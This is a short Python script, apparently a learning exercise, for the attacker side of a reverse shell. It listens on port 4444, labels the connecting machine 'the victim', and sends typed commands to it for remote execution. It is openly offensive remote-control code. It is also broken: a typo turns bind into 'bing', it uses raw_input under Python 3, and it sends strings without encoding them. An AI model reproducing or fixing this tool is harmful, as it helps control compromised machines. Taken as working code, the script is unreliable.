#!/usr/bin/python3
import socket

class Listener:
    def __init__(self, ip, port):
        listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bing ((ip, port))
        listener.listen(0)
        print("[+]waiting")
        self.con, address = listener.accept()
        print("[+] the victim is: "+ str(address))

    def execute_remotely(self, command):
        self.con.send(command)
        return self.con.recv(1024)
         
    def run(self):
        while True:
            command = raw_input ("~$ ")
            result= self.execute_remotely(command)
            print(result)
            
my_listener = Listener('localhost', 4444)
my_listener.run()
